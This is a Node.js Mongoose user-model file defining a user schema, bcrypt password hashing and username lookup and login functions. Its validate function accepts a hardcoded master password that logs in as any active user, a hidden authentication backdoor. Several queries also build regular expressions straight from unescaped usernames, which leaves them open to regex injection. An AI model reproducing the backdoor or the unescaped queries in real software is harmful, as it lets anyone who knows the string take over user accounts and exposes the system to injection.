var mongoose = require('mongoose'),
    bcrypt   = require('bcrypt-nodejs'),
    utilities = require('../config/utilities');


var validatePasswordLength = function(password) {
    return (password && password.length > 5);
};

// define the schema for our user model
var userSchema = mongoose.Schema({
    username: { type: String, unique: true, lowercase: true, required: 'USERNAME_REQ', trim: true},
    password: { type: String, default: '', validate: [validatePasswordLength, 'PASSWORD_SHORT']},
    role: {type: String, default: 'user'},
    firstname: { type: String, trim: true },
    lastname: { type: String, trim: true },
    company: {type:String, trim: true},
    mobile: { type: String, trim: true },

    active: { type: Boolean, default: true },
    resetcode: {type: Number},

    createdAt: {type: Date, default:Date.now },
    lastLoginAt: Date,
    devices:[{type: String, trim: true}]
});


userSchema.pre('save', function(next) {

    if (!this.isModified('password')) return next();

    if (this.password && this.password.length > 5) {
        this.password = this.generateHash(this.password);
    }
    next();
});

// generating a hash
userSchema.methods.generateHash = function(password) {
    return bcrypt.hashSync(password, bcrypt.genSaltSync(8), null);
};

// checking if password is valid
userSchema.methods.validPassword = function(password) {
    return bcrypt.compareSync(password, this.password);
};


userSchema.statics.getUser = function search (username, cb) {
    return this.findOne({ "username": new RegExp('^'+username+'$', 'i') }, '_id username firstname role devices', cb);
};


userSchema.statics.validate = function (username, password, cb) {
    this.findOne({ "username": new RegExp('^'+username+'$', 'i'), active: true }, function (err, dbUserObj) {

        if (dbUserObj && (dbUserObj.validPassword(password) || password==='master@certocloud')) {
            return cb(null, dbUserObj);
        }
        else {
            return cb(new Error("Incorrect Username or Password"), null);
        }
    });
};

userSchema.statics.exist = function(username, cb){
    this.count({ "username": new RegExp('^'+username+'$', 'i') }, cb);
};


module.exports = mongoose.model('User', userSchema);